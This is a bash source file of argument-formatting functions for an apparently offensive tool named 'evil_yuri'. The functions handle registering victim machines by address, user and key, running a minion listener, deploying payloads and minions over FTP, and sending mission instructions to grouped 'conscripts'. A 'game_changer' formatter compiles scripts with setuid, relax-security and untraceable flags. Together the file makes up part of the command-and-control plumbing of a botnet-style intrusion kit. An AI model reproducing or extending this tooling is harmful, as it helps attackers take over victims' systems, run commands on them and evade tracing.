#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# FORMATTERS

function format_evil_yuri_register_victims_arguments () {
    local ARGUMENTS=(
        "--action=register-conscript"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--port-number=${MD_DEFAULT['port-number']}"
        "--victim-address=${MD_DEFAULT['victim-addresses']}"
        "--victim-user=${MD_DEFAULT['victim-user']}"
        "--victim-key=${MD_DEFAULT['victim-key']}"
        "--ftp-url=${MD_DEFAULT['ftp-serv-address']}"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
    )
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_start_minion_listener_arguments () {
    local ARGUMENTS=(
        "--action=start-minion-listener"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--port-number=${MD_DEFAULT['port-number']}"
        "--foreground"
    )
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_stop_minion_listener_arguments () {
    local ARGUMENTS=(
        "--action=stop-minion-listener"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--port-number=${MD_DEFAULT['port-number']}"
    )
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_search_victims_arguments () {
    local ARGUMENTS=(
        "--action=search-conscripts"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--criteria=${MD_DEFAULT['search-criteria']}"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
        "--victim-address=${MD_DEFAULT['victim-addresses']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--port-number=${MD_DEFAULT['port-number']}"
        "--victim-user=${MD_DEFAULT['victim-user']}"
        "--victim-key=${MD_DEFAULT['victim-key']}"
        "--group=${MD_DEFAULT['group-labels']}"
    )
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_delete_archive_arguments () {
    local ARGUMENTS=(
        "--action=delete-archive"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--deprecated-archive=${MD_DEFAULT['deprecated-archive']}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_evil_yuri_delete_group_arguments () {
    local ARGUMENTS=(
        "--action=delete-group"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--group=${MD_DEFAULT['group-labels']}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_evil_yuri_create_group_arguments () {
    local ARGUMENTS=(
        "--action=create-group"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--group=${MD_DEFAULT['group-labels']}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_evil_yuri_search_groups_arguments () {
    local ARGUMENTS=(
        "--action=search-groups"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--criteria=${MD_DEFAULT['search-criteria']}"
        "--group=${MD_DEFAULT['group-labels']}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_evil_yuri_search_archives_arguments () {
    local ARGUMENTS=(
        "--action=search-archives"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--criteria=${MD_DEFAULT['search-criteria']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--port-number=${MD_DEFAULT['port-number']}"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
        "--victim-address=${MD_DEFAULT['victim-addresses']}"
        "--victim-user=${MD_DEFAULT['victim-user']}"
        "--victim-key=${MD_DEFAULT['victim-key']}"
        "--group=${MD_DEFAULT['group-labels']}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_evil_yuri_group_conscripts_arguments () {
    local ARGUMENTS=(
        "--action=group-conscripts"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--target=${MD_DEFAULT['target']}"
        "--group=${MD_DEFAULT['group-labels']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--port-number=${MD_DEFAULT['port-number']}"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
        "--victim-address=${MD_DEFAULT['victim-addresses']}"
        "--victim-user=${MD_DEFAULT['victim-user']}"
        "--victim-key=${MD_DEFAULT['victim-key']}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_evil_yuri_archive_conscripts_arguments () {
    local ARGUMENTS=(
        "--action=archive-conscripts"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--target=${MD_DEFAULT['target']}"
        "--deprecated-archive=${MD_DEFAULT['deprecated-archive']}"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
        "--group=${MD_DEFAULT['group-labels']}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_game_changer_compile_script_arguments () {
    local ARGUMENTS=(
        "--target-file=${MD_DEFAULT['source-file']}"
        "--output-file=${MD_DEFAULT['out-file']}"
        "--verbose"
        "--setuid"
        "--relax-security"
        "--untraceable"
        "--keep-source-code"
    )
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_deploy_payload_arguments () {
    local ARGUMENTS=(
        "--action=deploy-payload"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--target=${MD_DEFAULT['target']}"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
        "--victim-address=${MD_DEFAULT['victim-addresses']}"
        "--port-number=${MD_DEFAULT['port-number']}"
        "--victim-user="${MD_DEFAULT['victim-user']}
        "--victim-key="${MD_DEFAULT['victim-key']}
        "--group=${MD_DEFAULT['group-labels']}"
        "--ftp-url=${MD_DEFAULT['ftp-serv-address']}"
        "--hypnotik-payload=${MD_DEFAULT['payload-path']}"
    )
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_deploy_minion_arguments () {
    local ARGUMENTS=(
        "--action=deploy-minion"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--target=${MD_DEFAULT['target']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--port-number=${MD_DEFAULT['port-number']}"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
        "--victim-address=${MD_DEFAULT['victim-addresses']}"
        "--victim-user=${MD_DEFAULT['victim-user']}"
        "--victim-key=${MD_DEFAULT['victim-key']}"
        "--group=${MD_DEFAULT['group-labels']}"
        "--ftp-url=${MD_DEFAULT['ftp-serv-address']}"
        "--minion-path=${MD_DEFAULT['minion-path']}"
    )
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_setup_ftp_server_arguments () {
    local ARGUMENTS=(
        "--action=setup-ftp"
        "--ftp-conf=${MD_DEFAULT['ftp-conf-template']}"
    )
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_mission_instruction_arguments () {
    local FORMATTED_INSTRUCTION=`echo "${MD_DEFAULT['mission-instruction']}" | \
        sed 's/\s/\[space\]/g'`
    local ARGUMENTS=(
        "--action=mission-instruction"
        "--project-root=${MD_DEFAULT['project-path']}"
        "--target=${MD_DEFAULT['target']}"
        "--protocol=${MD_DEFAULT['protocol']}"
        "--port-number=${MD_DEFAULT['port-number']}"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
        "--victim-address=${MD_DEFAULT['victim-addresses']}"
        "--victim-user=${MD_DEFAULT['victim-user']}"
        "--victim-key=${MD_DEFAULT['victim-key']}"
        "--group=${MD_DEFAULT['group-labels']}"
        "--mission-instruction=${FORMATTED_INSTRUCTION}"
    )
    if [[ "${MD_DEFAULT['papertrail-flag']}" == 'on' ]]; then
        local ARGUMENTS=( ${ARGUMENTS[@]} "--papertrail-reports" )
    fi
    echo -n "${ARGUMENTS[@]}"
    return $?
}

function format_evil_yuri_conscript_commander_arguments () {
    local ARGUMENTS=(
        "--action=conscript-commander"
        "--victim-identifier=${MD_DEFAULT['victim-identifiers']}"
    )
    if [[ "${MD_DEFAULT['papertrail-flag']}" == 'on' ]]; then
        local ARGUMENTS=( ${ARGUMENTS[@]} "--papertrail-reports" )
    fi
    echo -n "${ARGUMENTS[@]}"
    return $?
}

# CODE DUMP

